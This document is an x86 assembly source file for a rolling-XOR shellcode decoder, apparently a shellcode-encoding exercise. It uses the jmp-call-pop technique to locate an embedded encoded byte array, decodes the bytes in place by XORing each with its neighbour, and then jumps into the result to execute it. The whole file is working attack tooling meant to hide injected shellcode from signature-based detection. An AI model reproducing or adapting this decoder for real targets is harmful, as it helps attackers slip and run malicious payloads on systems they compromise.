; Name: rolling-xor-decoder.asm
; Author: hodorsec

global _start

section .text
_start:
	jmp short call_shellcode

decoder:
    	pop esi         		; Being called by decoder, last pushed value on stack, put in ESI

	; Clear registers for usage
	xor ecx, ecx			; Clear for counting loop
	xor ebx, ecx
	xor edx, ecx

	mov cl, len			; Put length of EncodedShellcode into CL for count loop

decode:
	mov bl, [esi]			; Copy first character pointing from ESI to BL
	mov dl, [esi+1]			; Copy second character pointing from ESI to DL
	xor bl, dl			; Do a XOR on the character being stored in DL, copy result in BL
	mov [esi], bl			; Copy the XOR'ed value into the address where ESI is pointing to
	inc esi				; Move to next character
	loop decode			; "loop" automatically decrements CL, so loop until 0 then goto next instruction
	jmp EncodedShellcode 		; Jump to the address of the shellcode to execute

call_shellcode:
	call decoder
	; The encoded shellcode as generated by the python script
	EncodedShellcode: db 0xfb,0xca,0x0a,0x5a,0x32,0x1d,0x32,0x41,0x29,0x41,0x6e,0x0c,0x65,0x0b,0x82,0x61,0x31,0xb8,0x5a,0x09,0x80,0x61,0xd1,0xda,0x17,0x97	
	len: equ $-EncodedShellcode	; Variable for the length of the encoded shellcode

